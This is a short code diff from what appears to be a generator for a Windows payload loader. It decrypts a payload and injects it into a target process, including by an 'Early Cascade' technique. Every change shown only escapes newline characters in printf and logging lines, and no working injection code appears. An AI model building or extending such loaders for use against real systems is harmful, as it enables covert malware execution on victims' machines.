@@ -679,7 +679,7 @@ int main(int argc, char** argv) {{
 #endif
     
     if (!PerformInjection(&ctx)) {{
-        printf("[!] Injection failed\n");
+        printf("[!] Injection failed\\n");
         fflush(stdout);
         VirtualFree(pDecrypted, 0, MEM_RELEASE);
         return -1;
@@ -997,7 +997,7 @@ static DWORD WINAPI PayloadThread(LPVOID lpParam) {{
     ctx.dwInjectionMethod = INJECTION_METHOD;
 
     if (!PerformInjection(&ctx)) {{
-        printf("[!] Injection failed\n");
+        printf("[!] Injection failed\\n");
         fflush(stdout);
         VirtualFree(pDecrypted, 0, MEM_RELEASE);
         return 1;
@@ -1327,7 +1327,7 @@ static DWORD WINAPI PayloadThread(LPVOID lpParam) {{
     ctx.dwInjectionMethod = INJECTION_METHOD;
 
     if (!PerformInjection(&ctx)) {{
-        printf("[!] Injection failed\n");
+        printf("[!] Injection failed\\n");
         fflush(stdout);
         VirtualFree(pDecrypted, 0, MEM_RELEASE);
         return 1;
@@ -3728,7 +3728,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx);
 #include <string.h>
 
 // Always-on Early Cascade diagnostics (unconditional printf for failure diagnosis)
-#define LOG_EC(fmt, ...) do { printf("[EarlyCascade] " fmt "\n", ##__VA_ARGS__); fflush(stdout); } while(0)
+#define LOG_EC(fmt, ...) do { printf("[EarlyCascade] " fmt "\\n", ##__VA_ARGS__); fflush(stdout); } while(0)
 
 #ifndef LOG_ERROR
 #define LOG_ERROR(fmt, ...)
@@ -4247,7 +4247,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     BOOL   bSuccess             = FALSE;
 
     LOG_INFO("EarlyCascade: Starting injection into %ls", pCtx->wszTargetProcess);
-    printf("[EarlyCascade] InjectEarlyCascade called, target=%ls\n", pCtx->wszTargetProcess);
+    printf("[EarlyCascade] InjectEarlyCascade called, target=%ls\\n", pCtx->wszTargetProcess);
     fflush(stdout);
 
     si.cb = sizeof(si);
